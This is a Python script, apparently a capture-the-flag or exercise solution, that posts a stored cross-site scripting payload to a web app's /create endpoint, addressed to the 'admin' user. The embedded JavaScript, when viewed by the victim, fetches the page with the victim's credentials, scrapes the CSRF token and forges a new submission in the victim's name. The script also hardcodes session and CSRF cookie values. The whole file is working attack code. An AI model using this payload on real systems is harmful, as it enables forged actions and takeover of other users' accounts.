import requests

cookies = {
    'sessionid': 'es4etjzyfze8aajqzndle50gnss0zmg3',
    'csrftoken': 'ZbXOGLpXHpMfgFATjHUfTjTmGczW0Luj',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'pl-PL,pl;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'sessionid=es4etjzyfze8aajqzndle50gnss0zmg3; csrftoken=ZbXOGLpXHpMfgFATjHUfTjTmGczW0Luj',
    'Origin': 'https://web.kazet.cc:42448',
    'Referer': 'https://web.kazet.cc:42448/create',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data = {
    'csrfmiddlewaretoken': 'W8zDJ4KiLONEWTascYtCQZx42gxKGRDSL9mhfFZ5i3pJ2oAblvdHz8ggyiWwwsX1',
    'recipient': 'admin',
    'content': '''
        <script>
            fetch("https://web.kazet.cc:42448/create", {
                "headers": {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "pl-PL,pl;q=0.9,en-US;q=0.8,en;q=0.7",   
                    "sec-fetch-dest": "document",
                    "sec-fetch-mode": "navigate",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-user": "?1",
                    "upgrade-insecure-requests": "1"
                },
                "referrer": "https://web.kazet.cc:42448/",
                "referrerPolicy": "same-origin",
                "body": null,
                "method": "GET",
                "mode": "cors",
                "credentials": "include"
            })
            .then(response => {
                if (!response.ok) {
                throw new Error(`HTTP error! Status: ${response.status}`);
                }
                return response.text();
            })
            .then(htmlContent => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlContent, "text/html");
                const csrfToken = doc.querySelector('input[name="csrfmiddlewaretoken"]').value;
                var body_ = "csrfmiddlewaretoken=" + csrfToken + "&recipient=ziomek1&content=%3Cp%3EAAAAAAAAAAAAAAAAAAAAAAAAAA%3C%2Fp%3E&template=coffee";
                fetch("https://web.kazet.cc:42448/create", {
                    "headers": {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "pl-PL,pl;q=0.9",
                        "cache-control": "max-age=0",
                        "content-type": "application/x-www-form-urlencoded",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1"
                    },
                    "referrer": "https://web.kazet.cc:42448/create",
                    "referrerPolicy": "same-origin",
                    "body": body_,
                    "method": "POST",
                    "mode": "cors",
                    "credentials": "include"
                });
            })    
        </script>
    ''',
    'template': 'normal',
}

response = requests.post('https://web.kazet.cc:42448/create', cookies=cookies, headers=headers, data=data)
print(response.content)